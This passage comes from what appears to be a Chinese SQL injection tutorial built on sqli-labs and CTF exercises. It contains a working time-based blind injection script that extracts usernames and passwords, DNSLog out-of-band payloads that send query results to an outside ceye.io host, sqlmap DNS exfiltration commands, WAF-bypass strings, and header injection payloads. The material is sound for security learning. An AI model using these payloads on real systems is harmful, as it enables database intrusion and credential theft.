class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            payload = <span class="string">&quot;admin&#x27; and if(ascii(substr((select database()),%d,1))&gt;%d,sleep(1),0)#&quot;</span> % (i, mid)</span><br><span class="line">            data = &#123;<span class="string">&#x27;uname&#x27;</span>: payload, <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;aaaaa&#x27;</span>&#125;</span><br><span class="line">            <span class="comment">#params = &#123;&quot;id&quot;: payload&#125;</span></span><br><span class="line">            start_time = time.time()  <span class="comment"># 注入前的系统时间</span></span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            end_time = time.time()  <span class="comment"># 注入后的时间</span></span><br><span class="line">            <span class="keyword">if</span> end_time - start_time &gt; <span class="number">1</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name = name + <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_table</span>(<span class="params">url</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            payload = <span class="string">&quot;1&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (</span><br><span class="line">            i, mid)</span><br><span class="line">            params = &#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;</span><br><span class="line">            start_time = time.time()  <span class="comment"># 注入前的系统时间</span></span><br><span class="line">            r = requests.get(url, params=params)</span><br><span class="line">            end_time = time.time()  <span class="comment"># 注入后的时间</span></span><br><span class="line">            <span class="keyword">if</span> end_time - start_time &gt; <span class="number">1</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name = name + <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_column</span>(<span class="params">url</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            payload = <span class="string">&quot;1&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (</span><br><span class="line">            i, mid)</span><br><span class="line">            params = &#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;</span><br><span class="line">            start_time = time.time()  <span class="comment"># 注入前的系统时间</span></span><br><span class="line">            r = requests.get(url, params=params)</span><br><span class="line">            end_time = time.time()  <span class="comment"># 注入后的时间</span></span><br><span class="line">            <span class="keyword">if</span> end_time - start_time &gt; <span class="number">1</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name = name + <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_data</span>(<span class="params">url</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            payload = <span class="string">&quot;1&#x27; and if(ascii(substr((select concat(username,0x3a,password) from users limit 0,1),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (i, mid)</span><br><span class="line">            params = &#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;</span><br><span class="line">            start_time = time.time()  <span class="comment"># 注入前的系统时间</span></span><br><span class="line">            r = requests.get(url, params=params)</span><br><span class="line">            end_time = time.time()  <span class="comment"># 注入后的时间</span></span><br><span class="line">            <span class="keyword">if</span> end_time - start_time &gt; <span class="number">1</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name = name + <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inject_database(url)</span><br><span class="line"><span class="comment"># inject_table(url)</span></span><br><span class="line"><span class="comment"># inject_column(url)</span></span><br><span class="line"><span class="comment"># inject_data(url)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="搜索注入"><a class="markdownIt-Anchor" href="#搜索注入">#</a> 搜索注入</h5>
<p>在 like%% 中注入</p>
<h5 id="dnslog注入"><a class="markdownIt-Anchor" href="#dnslog注入">#</a> DNSLog 注入</h5>
<p>前提条件：secure_file_priv 为空</p>
<p>关于 secure_file_priv :</p>
<blockquote>
<p>secure_file_priv 特性，有三种状态</p>
<ol>
<li>secure_file_priv 为 null  表示不允许导入导出</li>
<li>secure_file_priv 指定文件夹时，表示 mysql 的导入导出只能发生在指定的文件夹</li>
<li>secure_file_priv 没有设置时，则表示没有任何限制</li>
</ol>
</blockquote>
<p>注入使用 load_file 函数</p>
<p>关于 load_file 函数</p>
<blockquote>
<p>LOAD_FILE () 函数读取一个文件并将其内容作为字符串返回</p>
<p>语法为：load_file (file_name)，其中 file_name 是文件的完整路径</p>
<p>此函数使用需要满足的条件</p>
<p>文件必须位于服务器主机上<br>
你必须具有该 FILE 权限才能读取该文件。拥有该 FILE 权限的用户可以读取服务器主机上的任何文件，该文件是 world-readable 的或 MySQL 服务器可读的，此属性与 secure_file_priv 状态相关<br>
文件必须是所有人都可读的，并且它的大小小于 max_allowed_packet 字节</p>
<p>select load_file(’/etc/passwd’);</p>
</blockquote>
<p>注入时需要使用 UNC 路径</p>
<blockquote>
<p>UNC 路径就是类似 \softer 这样的形式的网络路径。它符合 \servername\sharename 格式，其中 servername 是服务器名，sharename 是共享资源的名称。</p>
<p>目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename。</p>
<p>例如把自己电脑的文件共享，你会获得如下路径，这就是 UNC 路径</p>
</blockquote>
<p>常用的 DNSLog 平台</p>
<p><span class="exturl" data-url="aHR0cDovL2NleWUuaW8v">CEYE - Monitor service for security testing</span></p>
<p>注入方式：<br>
1. 注册上述平台，获取自己的 Identifier</p>
<p>2. 在 payloads 页面找到官方给出的不同数据库适用的 payload</p>
<p>3. 到测试目标修改并输入 payload</p>
<p>4. 如果可以明显看到有页面加载的过程，说明外带成功</p>
<p>下面使用 sqli 靶场做演示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.3xtn8b.ceye.io/abc&#x27;)))</span><br><span class="line">and (select load_file(concat(&#x27;//&#x27;,(select hex(user())),&#x27;.3xtn8b.ceye.io/abc&#x27;)))</span><br></pre></td></tr></table></figure>
<p>再到网页中 Records-&gt;DNS Query 即可到的注入的数据</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220215231635316.png" alt="image-20220215231635316"></p>
<p>注意：如果注入的字符中带有非法字符，比如 &quot;@&quot;, 需要使用 hex () 进行 16 进制编码，获取数据后在进行解码</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMToxODg4OC9zcWxpL2xlc3MtMS8/aWQ9MSUyNyUyMGFuZCUyMChzZWxlY3QlMjBsb2FkX2ZpbGUoY29uY2F0KCUyNy8vJTI3LChzZWxlY3QlMjBoZXgodXNlcigp">http://127.0.0.1:18888/sqli/less-1/?id=1' and (select load_file(concat('//',(select hex(user()</span>)),%<span class="exturl" data-url="aHR0cDovLzI3LjN4dG44Yi5jZXllLmlvL2FiYyUyNw==">27.3xtn8b.ceye.io/abc'</span>)))%23</p>
</blockquote>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220215232952016.png" alt="image-20220215232952016"></p>
<h5 id="使用burpdnslog快速获取全部数据"><a class="markdownIt-Anchor" href="#使用burpdnslog快速获取全部数据">#</a> 使用 Burp+DNSlog 快速获取全部数据</h5>
<p>使用 Burp 中的 intruder 模块配合 DNSlog 平台的导出功能。核心是控制 limit x,1 中的变量 x，实现自动查询下一个数据</p>
<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xMjk5MDQwMjU=">https://zhuanlan.zhihu.com/p/129904025</span></p>
<p>发送 URL 到 burp 的测试器</p>
<p>limit 0，1 后面的 0 设置为变量</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-3309297fe1795a587e808195b6582d15_720w.jpg" alt="img"></p>
<p>payload 选择</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-a9c23d520c5668e36296576a81b3605a_720w.jpg" alt="img"></p>
<p>线程设置为 1</p>
<p><img data-src="https://pic1.zhimg.com/80/v2-82412940b45778e3dfdbcbd2fd5616a8_720w.jpg" alt="img"></p>
<p>然后开始攻击</p>
<p>完成以后</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-8c1ba9bd1ab38ca059d525044cb30ecb_720w.jpg" alt="img"></p>
<p>可以在平台上查到获取到的表名</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-4da5cf686963af08917d23d77e344f3f_720w.jpg" alt="img"></p>
<p>平台提供文件导出为 json 文件的功能</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-e825098900bde120e4699a7b23da3cf9_720w.jpg" alt="img"></p>
<p>下载到本地，放到脚本目录</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#python3</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">#自己平台的地址</span><br><span class="line">url = &#x27;.xxx.ceye.io&#x27;</span><br><span class="line"></span><br><span class="line">f = open(&#x27;./data.json&#x27;)</span><br><span class="line">json_data = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">data = json.loads(json_data)</span><br><span class="line"></span><br><span class="line">data_list = []</span><br><span class="line"></span><br><span class="line">for i in data:</span><br><span class="line">    data_list.append(i[&#x27;name&#x27;].replace(url,&#x27;&#x27;))</span><br><span class="line"></span><br><span class="line">data_list = list(set(data_list))</span><br><span class="line">for i in data_list:</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>
<p>可以去重以后打印出刚才获取的数据</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-55e96da4d9ec9f31b14522af3a1b419e_720w.png" alt="img"></p>
<h5 id="dnslog配和sqlmap进行注入"><a class="markdownIt-Anchor" href="#dnslog配和sqlmap进行注入">#</a> DNSLog 配和 Sqlmap 进行注入</h5>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220308110248704.png" alt="image-20220308110248704"></p>
<p>MX 记录优先级高于 A 记录</p>
<p>泛域名、泛解析：*.baidu.com 解析全部子域名</p>
<p>1. 安装 dns 服务器</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525161508227.png" alt="在这里插入图片描述"></p>
<p>点击下一步，勾选 dns 服务器</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525161633827.png" alt="在这里插入图片描述"></p>
<p>连续下一步，之后点击安装，等待安装…<br>
 安装完成之后在开始管理工具中选择 dns 管理器<br>
右键，属性</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525162032613.png" alt="在这里插入图片描述"></p>
<p>在监视中对测试类型打钩</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/2020052516213329.png" alt="在这里插入图片描述"></p>
<p>在正常查找区域中右键选择新建区域</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525162229974.png" alt="在这里插入图片描述"></p>
<p>设置新建区域名称</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525162320546.png" alt="在这里插入图片描述"></p>
<p>继续默认下一步就可以<br>
进入我们设置的域名，右键，新建主机（A 记录）</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525162549151.png" alt="在这里插入图片描述"></p>
<p>设置域名，这里的 ip 地址为 kali 的 ip</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525162723189.png" alt="在这里插入图片描述"></p>
<p>继续添加泛解析</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525162842913.png" alt="在这里插入图片描述"></p>
<p>添加转发</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525184140431.png" alt="在这里插入图片描述"></p>
<p>修改靶机 dns 服务器为刚刚设置的 dns 服务器</p>
<p>sqlmap 进行注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://xx.xx.xx.xx/index.php?id=1&quot; --technique=T --dns-domain &quot;oupeng.top&quot; -D security --tables</span><br></pre></td></tr></table></figure>
<p>上述 sqlmap 命令作用：使用 ouepng.top 作为外带的网址。假设有台设备，kali (172.16.60.166),DNS Server (172.16.60.222), 目标靶机 (172.16.60.250)</p>
<p>kali 上的 salmap 对目标靶机发送查询请求，并且告诉靶机将返回的内容回给 oupeng.top。由于靶机上 DNS 解析使用的是 222，因此靶机会将域名解析到 DNS server 上。此时 DNS Server 又设置了条件转发器，将 oupeng.top 转发给 Kali，此时 sqlmap 即可获得最终的查询结果</p>
<p>DNSLog+Sqlmap 注入过程详解：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1545399-20190329195347336-890312924.png" alt="img"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1884700-20210210181326467-645056694.png" alt="img"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220308114540681.png" alt="image-20220308114540681"></p>
<h5 id="二次注入"><a class="markdownIt-Anchor" href="#二次注入">#</a> 二次注入</h5>
<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当 Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入。</p>
<p><strong>二次注入，可以概括为以下两步:</strong></p>
<ul>
<li>第一步：插入恶意数据<br>
进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>
<li>第二步：引用恶意数据<br>
开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li>
</ul>
<p>（1）在 sqli_libs 的第 24 关，其页面如下所示:</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105005024-806493659.png" alt="img"></p>
<p>（2）当我们点击 Forgot your password? 时，出现提示：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105102785-611421933.png" alt="img"></p>
<p>（3）因此可以尝试在注册页面进行二次注入，首先，我们注册一个账号，名为：admin’#  , 密码为：123456</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105243499-1857146880.png" alt="img"></p>
<p>（4）注册成功，尝试登录 admin‘# ，然后可以查看一下 phpmyadmin 内存储情况</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105410212-767676584.png" alt="img"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105510664-365259773.png" alt="img"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105550423-781051799.png" alt="img"></p>
<p>（5）而这时的 admin 原密码是 admin，并且两个账号都存储在数据库内的。当我们重新修改 admin’# 的密码的时候，这里修改为：12345678；可以发现二次注入的威力所在。admin 的密码被修改为了：12345678；而 admin’# 用户的密码并没有发生变化。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105826556-1459172615.png" alt="img"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105908571-1427285546.png" alt="img"></p>
<p>下面简单对代码进行一下分析：<br>
1. 注册模块：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//$username=  $_POST[&#x27;username&#x27;] ;</span><br><span class="line">$username=  mysql_escape_string($_POST[&#x27;username&#x27;]) ;</span><br><span class="line">$pass= mysql_escape_string($_POST[&#x27;password&#x27;]);</span><br><span class="line">$re_pass= mysql_escape_string($_POST[&#x27;re_password&#x27;]);</span><br></pre></td></tr></table></figure>
<p>login_create 中对所有字段均进行了严格的过滤，无法进行注入。但我们可以注册一个用户 <code>admin'#</code></p>
<p>顺便插一句嘴，解释两个函数：</p>
<p>mysql_escape_string 使用该函数对字符转义后插入数据库中会去除转义字符</p>
<p>mysql_real_escape_string  使用该函数对字符转义后插入数据库中会保留转义字符</p>
<p>因此 admin’# 虽然在 $username 中会被转义，但插入数据库中时仍保持原样。</p>
<p>利用这个，我们创建用户 admin’#，然后用该用户登录</p>
<p>登录后通过修改密码达成二次注入的目的。因为修改密码时我们就可以引用恶意数据</p>
<p>在 pass_change.php 中代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if($pass==$re_pass)</span><br><span class="line">&#123;	</span><br><span class="line">	$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br><span class="line">	$res = mysql_query($sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;);</span><br><span class="line">	$row = mysql_affected_rows();</span><br></pre></td></tr></table></figure>
<p>用于当前修改的是 admin’# 的密码，username 的值为 admin’#，于是语句变为下面的语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=admin&#x27;# and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>
<p>产生的问题在于原密码被注释了，我们修改的用户从 admin’# 变为了 admin，直接不需要原始密码就可以修改管理员的密码</p>
<p>于是二次注入产生</p>
<h5 id="二次注入相关的ctf-game"><a class="markdownIt-Anchor" href="#二次注入相关的ctf-game">#</a> 二次注入相关的 CTF GAME</h5>
<p>1.git 泄露</p>
<p>git add   // 提交到缓冲区</p>
<p>git commit -m // 提交到本地仓库</p>
<p>git push  // 提交到远端仓库</p>
<p>当 git 泄露时可以通过 githack 还原文件</p>
<p>git log --reflog 可以查看提交记录</p>
<p>通过 git reset --hard 更改指针位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>[网鼎杯 2018] Comment</p>
<p>2.PHP:filter</p>
<!--?file=?--> 接收get传入的file参数，用php伪协议读源码
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
<p>修改地址存在二次注入，从数据库中取 old_address 时没有过滤</p>
<p>[[CISCN2019 华北赛区 Day1 Web5] CyberPunk.rar](buu [CISCN2019 华北赛区 Day1 Web5] CyberPunk.rar)</p>
<h5 id="带有waf过滤的sql注入"><a class="markdownIt-Anchor" href="#带有waf过滤的sql注入">#</a> 带有 WAF 过滤的 SQL 注入</h5>
<p>1. 过滤 and、or</p>
<p>在过滤一遍的场景下可以尝试双写，大小写</p>
<p><em>在使用 preg_replace 过滤时，只会替换一次，但使用正则表达式时会匹配多次。</em></p>
<p>或者使用逻辑运算符，使用 || 代替 or，&amp;&amp; 代替 and，但需要对 &amp;&amp; 进行编码 %26%26，URLcode 不用对 || 编码</p>
<p>2. 过滤空格</p>
<p>使用 /**/ 多行注释代替</p>
<p>%0a,% a0,%0b 代替空格 (不同的操作系统，不同的环境代替空格的符号也不同，windows 使用 % A0，产生乱码，无法代替空格，使用 %0a,linux 使用 % a0,%0b)</p>
<p>使用 () 将语句括起来代替空格 [[极客大挑战 2019] HardSQL.zip](buu [极客大挑战 2019] HardSQL.zip)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=444%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like%27geek%27)),0x7e),1)%23</span><br></pre></td></tr></table></figure>
<p>3. 过滤注释</p>
<p>如果用单引号闭合，使用 and’1’='1 代替注释</p>
<p>使用；%00 截断</p>
<p>4.union select 过滤</p>
<p>uniunion selecton select</p>
<p>5. 过滤 =</p>
<p>like</p>
<p>regexp</p>
<h5 id="referer注入"><a class="markdownIt-Anchor" href="#referer注入">#</a> referer 注入</h5>
<p>通过 referer 字段不严格的过滤产生注入</p>
<p>phpcmsv9 存在 referer 注入</p>
<p>sqllab pass-19</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175006708.png" alt="image-20220311175006708"></p>
<p>通过闭合确定 referer 存在注入</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175111332.png" alt="image-20220311175111332"></p>
<p>构造如下 payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Referer: 1&#x27; and updatexml(1,(concat(0x7e,user(),0x7e)),1) and &#x27;1&#x27;=&#x27;1</span><br><span class="line">Referer: 1&#x27; and updatexml(1,(concat(0x7e,user(),0x7e)),1) )#</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175111332.png" alt="image-20220311175111332"></p>
<p>注意题目源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br><span class="line">闭合时需要在闭合一个括号</span><br></pre></td></tr></table></figure>
<h5 id="user-agent注入"><a class="markdownIt-Anchor" href="#user-agent注入">#</a> user-agent 注入</h5>
<p>参考 sqllab 第 18 关</p>
<p>1. 关于 sql 参数过滤，check_input 用于检查输入的内容。</p>
<p>第二个 if 判断魔术开关是否打开，如果打开，则去除转义字符。魔术开关用于给特定的字符加转义字符</p>
<p>如果没有开魔术开关，则使用 mysql_real_escape_string 转义特殊字符。如果不写<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mo>=</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>p</mi><mi>s</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>h</mi><mi>e</mi><mi>s</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">value = stripslashes(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">u</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mopen">(</span></span></span></span>value); 会导致由于魔术开关增加一次转义字符，mysql_real_escape_string 又会增加一次转义字符，双重转义导致转义失效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">function check_input($value)</span><br><span class="line">	&#123;</span><br><span class="line">	if(!empty($value))</span><br><span class="line">		&#123;</span><br><span class="line">		// truncation (see comments)</span><br><span class="line">		$value = substr($value,0,20);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Stripslashes if magic quotes enabled</span><br><span class="line">		if (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		// Quote if not a number</span><br><span class="line">		if (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	return $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>根据代码审计，这关必须建立在用户名和密码正确的基础上，输入正确的 username 和 password 之后抓包</p>
